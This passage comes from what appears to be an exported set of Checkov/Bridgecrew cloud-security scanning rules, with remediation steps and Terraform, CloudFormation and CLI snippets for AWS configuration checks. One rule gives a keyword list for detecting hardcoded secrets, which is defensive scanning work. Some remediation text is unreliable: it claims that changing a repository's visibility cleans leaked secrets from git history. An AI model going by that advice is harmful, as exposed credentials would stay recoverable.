<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_vpc, aws_subnet, aws_network_interface, aws_instance</li>
<li><strong>Argument:</strong> <em>network_interface</em> of aws_instance</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_vpc" "my_vpc" {
  cidr_block = "172.16.0.0/16"

  tags = {
    Name = "tf-example"
  }
}

resource "aws_subnet" "my_subnet" {
  vpc_id            = aws_vpc.my_vpc.id
  cidr_block        = "172.16.10.0/24"
  availability_zone = "us-west-2a"

  tags = {
    Name = "tf-example"
  }
}

resource "aws_network_interface" "network_interface_ok" {
  subnet_id   = aws_subnet.my_subnet.id
  private_ips = ["172.16.10.100"]

  tags = {
    Name = "primary_network_interface"
  }
}

resource "aws_instance" "foo" {
  ami           = "ami-005e54dee72cc1d00" # us-west-2
  instance_type = "t2.micro"

  network_interface {
    network_interface_id = aws_network_interface.network_interface_ok.id
    device_index         = 0
  }

  credit_specification {
    cpu_credits = "unlimited"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-ec2-instances-belong-to-a-vpc' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-ec2-instances-belong-to-a-vpc</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-ec2-instances-belong-to-a-vpc' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_10</key>
    <name>Secret Keyword</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="secret-keyword"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-secret-keyword"></div>Secret Keyword</div><a aria-label="Skip link to Secret Keyword" class="heading-anchor-icon fa fa-anchor" href="#secret-keyword"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check attempts to identify non-standard secrets by using standard keyword conventions used to annotate secrets in custom application code. The check utilizes the following keywords:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">'api_?key',
'auth_?key',
'service_?key',
'account_?key',
'db_?key',
'database_?key',
'priv_?key',
'private_?key',
'client_?key',
'db_?pass',
'database_?pass',
'key_?pass',
'password',
'passwd',
'pwd',
'secret',
'contrase&#241;a',
'contrasena',
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke Secret.</p>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p>
<p>Step 3: Check your application access logs to ensure the key was not utilized during the compromised period.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_10' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_23</key>
    <name>Ensure Route53 A Record has an attached resource</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="route53-a-record-does-not-have-attached-resource"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-route-53-a-record-does-not-have-attached-resource"></div>Route53 A Record does not have Attached Resource</div><a aria-label="Skip link to Route53 A Record does not have Attached Resource" class="heading-anchor-icon fa fa-anchor" href="#route53-a-record-does-not-have-attached-resource"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check ensures that Route53 A records point to resources part of your Account rather than just random IP addresses. On the platform this check additionally compares IP's against provisioned EIP. In Checkov the graph correlates the A record against know AWS resources from EIP to Global Accelerator.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-route53-a-record-has-an-attached-resource' target='_blank'> https://docs.bridgecrew.io/docs/ensure-route53-a-record-has-an-attached-resource</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-route53-a-record-has-an-attached-resource' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_61</key>
    <name>Ensure AWS IAM policy does not allow assume role permission across all services</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-policy-does-allow-assume-role-permission-across-all-services"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-policy-does-allow-assume-role-permission-across-all-services"></div>AWS IAM policy does allow assume role permission across all services</div><a aria-label="Skip link to AWS IAM policy does allow assume role permission across all services" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-policy-does-allow-assume-role-permission-across-all-services"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IAM role is an identity with specific permissions. An IAM role is similar to an IAM user, it is an AWS identity with permission policies that determine what the identity can and cannot do in AWS. When a user assumes a role, it provides temporary security credentials for a bounded session.</p>
<p>We recommend that you define fine-grained roles for specific services or principles. For example, when settings up an AWS service role it is recommended to include only the permissions required for the service to access the AWS resources required. Alternatively, you can use a Principal as an entity in AWS that can perform actions and access resources. The main benefit of the Principal entity is to limit the use of wildcards in the policy document.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::IAM::Role</li>
<li><strong>Argument:</strong> Properties.AssumeRolePolicyDocument.Statement</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ExecutionRole:
      Type: AWS::IAM::Role
      Properties:
        ...
        AssumeRolePolicyDocument:
          ...
          Statement:
          - Effect: "Allow"
            Principal:
                AWS:
-                 - arn:aws:iam::123456789101:root
-                                   - 123456789101
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_iam_45' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_iam_45</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_iam_45' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_121</key>
    <name>Ensure AWS config is enabled in all regions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-config-is-not-enabled-in-all-regions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-config-is-not-enabled-in-all-regions"></div>AWS config is not enabled in all regions</div><a aria-label="Skip link to AWS config is not enabled in all regions" class="heading-anchor-icon fa fa-anchor" href="#aws-config-is-not-enabled-in-all-regions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Config is a web service that performs the configuration management of supported AWS resources within your account and delivers log files to you. The recorded information includes: the configuration item (AWS resource), relationships between configuration items (AWS resources), and any configuration changes between resources. The AWS configuration item history captured by AWS Config enables security analysis, resource change tracking, and compliance auditing. </p>
<p>We recommend you enable AWS Config in all regions. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To implement AWS Config configuration using the AWS Management Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>At the top right of the console select the <em>region</em> you want to focus on. </li>
<li>Click <strong>Services</strong>. </li>
<li>Click <strong>Config</strong>. </li>
<li>Define which resources you want to record in the selected region. Include global resources (IAM resources).</li>
<li>Select an <em>S3 bucket</em> in the same account, or in another managed AWS account. </li>
<li>Create an <em>SNS Topic</em> from the same AWS account, or from another managed AWS account. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the policy using the following steps and commands:</p>
<ol>
<li>Ensure there is an appropriate S3 bucket, SNS topic, and IAM role per the AWS Config Service prerequisites. </li>
<li>Set up the configuration recorder: </li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws configservice subscribe 
--s3-bucket my-config-bucket 
--sns-topic arn:aws:sns:us-east-1:012345678912:my-config-notice 
--iam-role arn:aws:iam::012345678912:role/myConfigRole 
</code></pre>
<ol start="3">
<li>Start the configuration recorder: </li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">start-configuration-recorder 
--configuration-recorder-name &lt;value&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_config_configuration_aggregator</li>
<li><strong>Argument:</strong> all_regions </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_config_configuration_aggregator" "organization" {
  name = "example"
  account_aggregation_source {
    account_ids  = ["123456789012"]
+   all_regions  = true
  }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_5-enable-aws-config-regions' target='_blank'> https://docs.bridgecrew.io/docs/logging_5-enable-aws-config-regions</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_5-enable-aws-config-regions' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_12</key>
    <name>Ensure AWS Default Security Group restricts all traffic</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-default-security-group-does-not-restrict-all-traffic"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-default-security-group-does-not-restrict-all-traffic"></div>AWS Default Security Group does not restrict all traffic</div><a aria-label="Skip link to AWS Default Security Group does not restrict all traffic" class="heading-anchor-icon fa fa-anchor" href="#aws-default-security-group-does-not-restrict-all-traffic"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>A VPC comes with a default security group that has an initial setting denying all inbound traffic, allowing all outbound traffic, and allowing all traffic between instances assigned to the security group. If you do not specify a security group when you launch an instance, the instance is automatically assigned to this default security group. Security groups are stateful and provide filtering of ingress/egress network traffic to AWS resources. </p>
<p>We recommend that your default security group restricts all inbound and outbound traffic. The default VPC in every region should have its default security group updated to comply with this recommendation. Any newly created VPCs will automatically contain a default security group that will need remediation to comply with this recommendation.</p>
<p>Configuring all VPC default security groups to restrict all traffic will encourage least privilege security group development and mindful placement of AWS resources into security groups. This in-turn reduces the exposure of those resources.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>When implementing this recommendation, VPC flow logging is invaluable in determining the least privilege port access required by systems to work properly.  VPC flow logging can log all packet acceptances and rejections occurring under the current security groups. This dramatically reduces the primary barrier to least privilege engineering, discovering the minimum ports required by systems in the environment. Even if the VPC flow logging recommendation described is not adopted as a permanent security measure, it should be used during any period of discovery and engineering for least privileged security groups.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="procedure"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-procedure"></div>Procedure</div><a aria-label="Skip link to Procedure" class="heading-anchor-icon fa fa-anchor" href="#procedure"></a></h2>
<p><strong>Security Group Members: </strong></p>
<p>To implement the prescribed state, follow these steps:</p>
<ol>
<li>Identify AWS resources that exist within the default security group.</li>
<li>Create a set of least privilege security groups for those resources.</li>
<li>Place the resources in those security groups.</li>
<li>Remove the resources noted in Step 1 from the default security group. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p><strong>Security Group State</strong></p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="http://console.aws.amazon.com/vpc/home" target="_self">Amazon VPC console</a>.</li>
<li>Repeat the next steps for all VPCs, including the default VPC in each AWS region:<br/>
a) In the left pane, click <strong>Security Groups</strong>.<br/>
b) For each default security group, perform the following:<br/>
i) Select the default <em>security group</em>.<br/>
ii) Click <strong>Inbound Rules</strong>.<br/>
iii) Remove any <em>inbound rules</em>.<br/>
iv) Click <strong>Outbound Rules</strong>.<br/>
v) Remove any <em>outbound rules</em>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources:</strong> aws_default_security_group + aws_vpc</li>
<li><strong>Argument:</strong> vpc_id (of aws_default_security_group)</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_default_security_group" "default" {
  vpc_id = aws_vpc.ok_vpc.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/networking_4' target='_blank'> https://docs.bridgecrew.io/docs/networking_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/networking_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_35</key>
    <name>Ensure AWS CloudTrail logs are encrypted using CMKs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudtrail-logs-are-not-encrypted-using-cmks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-trail-logs-are-not-encrypted-using-cm-ks"></div>AWS CloudTrail logs are not encrypted using CMKs</div><a aria-label="Skip link to AWS CloudTrail logs are not encrypted using CMKs" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudtrail-logs-are-not-encrypted-using-cmks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS CloudTrail is a web service that records AWS API calls for an account, and makes those logs available to users and resources in accordance with IAM policies. AWS Key Management Service (KMS) is a managed service that helps create and control the encryption keys used to encrypt account data. It uses Hardware Security Modules (HSMs) to protect the security of encryption keys. CloudTrail logs can be configured to leverage server-side encryption (SSE) and KMS customer created master keys (CMK) to further protect CloudTrail logs. </p>
<p>We recommend that CloudTrail logs are configured to use SSE-KMS, providing additional confidentiality controls on log data. A given user must have S3 read permission on the corresponding log bucket and must be granted decrypt permission by the CMK policy.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To configure CloudTrail to use SSE-KMS using the Management Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/cloudtrail/" target="_self">Amazon CloudTrail console</a></strong>.</li>
<li>In the left navigation pane, click <strong>Trails</strong>. </li>
<li>Select a <em>Trail</em>. </li>
<li>Navigate to the <strong>S3</strong> section, click the edit button (pencil icon). </li>
<li>Click <strong>Advanced</strong>. </li>
<li>From the <strong>KMS key Id</strong> drop-down menu, select an existing CMK. </li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>Ensure the CMK is located in the same region as the S3 bucket.</p></blockquote>
<ol start="8">
<li>For CloudTrail as a service to encrypt and decrypt log files using the CMK provided, apply a KMS Key policy on the selected CMK. </li>
<li>Click <strong>Save</strong>. </li>
<li>You will see a notification message stating that you need to have decrypt permissions on the specified KMS key to decrypt log files. Click <strong>Yes</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update the CloudTrail, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws cloudtrail update-trail 
--name &lt;trail_name&gt; 
--kms-id &lt;cloudtrail_kms_key&gt; aws kms put-key-policy 
--key-id &lt;cloudtrail_kms_key&gt; 
--policy &lt;cloudtrail_kms_key_policy&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::CloudTrail::Trail</li>
<li><strong>Argument:</strong> Properties.KMSKeyId</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
    myTrail: 
    Type: AWS::CloudTrail::Trail
        Properties: 
            ...
+           KMSKeyId: alias/MyAliasName
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_7' target='_blank'> https://docs.bridgecrew.io/docs/logging_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_12</key>
    <name>NPM Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="npm-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-npm-token"></div>NPM Token</div><a aria-label="Skip link to NPM Token" class="heading-anchor-icon fa fa-anchor" href="#npm-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The NPM access token can be used to authenticate to npm when using the API or the npm command-line interface (CLI). An access token is a hexadecimal string that you can use to authenticate, and which gives you the right to install and/or publish your modules.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>Step 1: Revoke Secret.</p>
<ol>
<li>To see a list of your tokens, on the command line, run:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">npm token list
</code></pre>
<ol start="2">
<li>In the tokens table, find and copy the ID of the token you want to delete. On the command line, run the following command, replacing 123456 with the ID of the token you want to delete:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">npm token delete 123456
npm will report Removed 1 token
</code></pre>
<ol start="3">
<li>To confirm that the token has been removed, run:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">npm token list
</code></pre>
<p>Step 2: Clean the git history.<br/>
Go under the settings section of your GitHub project and chose the change visibility button at the bottom.</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_12' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_93</key>
    <name>Ensure S3 bucket MFA Delete is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-mfa-delete-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-mfa-delete-is-not-enabled"></div>S3 bucket MFA Delete is not enabled</div><a aria-label="Skip link to S3 bucket MFA Delete is not enabled" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-mfa-delete-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>If a bucket's versioning configuration is MFA Delete: enabled, the bucket owner must include the x-amz-mfa request header to delete an object. Requests that include x-amz-mfa must use HTTPS.</p>
<p>Configuring a bucket to enable MFA (multi-factor authentication) Delete requires additional authentication for either of the following operations:<br/>
(1) Change the versioning state of your bucket<br/>
(2) Permanently delete an object version.</p>
<p>We recommend you configure S3 bucket with MFA Delete: enabled.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws s3api put-bucket-versioning --profile my-root-profile --bucket my-bucket-name --versioning-configuration Status=Enabled,MFADelete=Enabled --mfa &#8220;arn:aws:iam::00000000:mfa/root-account-mfa-device 123456&#8221;
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p><strong>Resource:</strong>aws_s3_bucket<br/>
<strong>Argument:</strong>mfa_delete - (Optional) Enable MFA delete for either Change the versioning state of your bucket or Permanently delete an object version. Default is false. This cannot be used to toggle this setting but is available to allow managed buckets to reflect the state in AWS</p>
